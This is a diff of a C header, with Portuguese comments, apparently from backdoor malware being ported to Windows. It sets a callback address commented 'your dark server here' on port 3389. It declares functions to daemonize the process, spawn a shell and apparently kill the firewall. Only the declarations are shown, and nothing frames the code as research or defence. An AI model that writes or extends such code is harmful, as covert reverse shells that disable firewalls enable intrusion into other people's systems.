@@ -17,22 +17,25 @@
 
 /* Sockets */
 
-//#ifdef _WIN32
-//#include <winsock2.h>
-//#include <windows.h>
- //#pragma comment(lib,"ws2_32.lib")
-
-//#else
-
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <sys/types.h>
-#include <fcntl.h>
-#include <X11/Xlib.h>
-
+#if defined(_WIN32) || defined(_WIN64)
+    #include <winsock2.h>
+    #include <windows.h>
+    #pragma comment(lib,"ws2_32.lib") // Para o linker do MSVC
+#else // Assumindo sistemas baseados em Unix (Linux)
+    #include <sys/socket.h>
+    #include <arpa/inet.h>
+    #include <sys/types.h>
+    #include <fcntl.h>
+    #include <X11/Xlib.h> // Específico do Linux, pode ser removido se não for usado
+#endif
 
 #define remote_addr "0.0.0.0" /* your dark server here */
 #define remote_port 3389
+
+// Declarações de funções que serão implementadas de forma diferente
+void daemonize();
+void shell();
+int kill_frwl();
 
 //#define focusWin
 
@@ -58,4 +61,3 @@ extern char *__progname;
 
 
 #endif // _MAIN_H
-
